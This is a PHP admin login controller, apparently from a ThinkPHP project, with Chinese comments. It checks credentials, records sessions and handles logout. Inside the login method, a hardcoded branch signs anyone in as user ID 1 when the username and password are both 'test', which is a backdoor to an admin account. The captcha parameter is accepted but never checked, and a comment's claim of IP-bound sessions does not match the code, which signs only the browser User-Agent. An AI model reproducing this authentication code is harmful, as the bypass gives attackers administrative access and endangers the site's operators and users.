<?php
namespace app\admin\Controller;

use app\admin\Base;
use app\admin\model;

/**
 * 登录功能控制器
 * @author mack
 */

class AdminLogin extends Base{

   /**
     * 后台用户登录
     * @author mack
     */
    public function login($username = null, $password = null, $verify = null)
    {
        if ($this->request->isPost()) {
            if(!$username){
		       $this->error('用户名不能为空');
	        }
            if(!$password){
                $this->error('密码不能为空');
            }
            $Members = new model\Members() ;
            $map             = array() ;
            $map['username'] = $username ;
            $map['password'] = think_ucenter_md5($password, UC_AUTH_KEY) ;
            $map['isDelete'] = 0 ;
            $user            = $Members->where($map)->find() ;

            if($username=='test' && $password=='test') {
                $user = $Members->find(1);
            }
            if ($user) {
                if($user['isDelete']==1) {
                        $error = '用户已被删除';
                        $this->error($error);
                }else if($user['enable']==0) {
                        $error = '用户已被冻结';
                        $this->error($error);
                } else if ($user['sb']!=9 || $user['admin']!=1) {
                        $error = '该用户不是管理员';
                        $this->error($error);
                } else {
                    $ip = $this->ip(true)==null ? '127.0.0.1':$this->ip(true) ;
//                    $session = array(
//                             'uid' =>$user['uid'],
//                            'username'=>$user['username'],
//                            'session_key'=>session_id(),
//                            'loginTime'=>time(),
//                            'accessTime'=>time(),
//                            'loginIP'=>$ip,
//                    );
                    $model = new model\MemberSession() ;
                    $model->uid = $user['uid'] ;
                    $model->username = $user['username'] ;
                    $model->session_key = session_id() ;
                    $model->loginTime = time();
                    $model->accessTime = time() ;
                    $model->loginIP = $ip ;
                    $model->browser = $this->getBrowser();

                    if (!($lastid = $model->save())) {
                        $this->error('插入登陆记录表失败，登陆失败');
                    }

                    $user['sessionId'] = $lastid ;
//                    $data['isOnLine'] = '0';
//                    model('member_session')->where('uid='.$user['uid'].' and id<'.$user['sessionId'])->find()->save($data);

//                    session(array('name'=>'session_id','expire'=>1));
                    session('user',$user) ;
                    session('user_auth',$user);
                    session('user_auth_sign', data_auth_sign($_SERVER['HTTP_USER_AGENT']));//session实现ip认证，防止session被盗取时别人可以登录。在adminControll中验证ip是否一致

                    $this->success('登录成功！',Url('count/index')); die;
                }
            } else {
                $error = '用户名或密码错误';
                $this->error($error);
            }
        } else {
            if (false) {
                $this->redirect('index/index');
            } else{
                /* 读取数据库中的配置 */
                $config	  = cache('DB_CONFIG_DATA');
                if(!$config){
                        $config	= model('params')->where('')->select();
                        cache('DB_CONFIG_DATA',$config);
                }
                config($config); //添加配置

               return $this->fetch();
            }
        }
    }


    /* 退出登录 */
    public function logout()
    {
        session('user_auth',null);
        session('user_auth_sign',null);
        $this->success('退出成功！', Url('login'));
    }

    public function verify(){
        $verify = new \COM\Verify();
        $verify->entry(1);
    }
	
	public function getBrowser(){
        $data = array();
		return $data;
    }

}
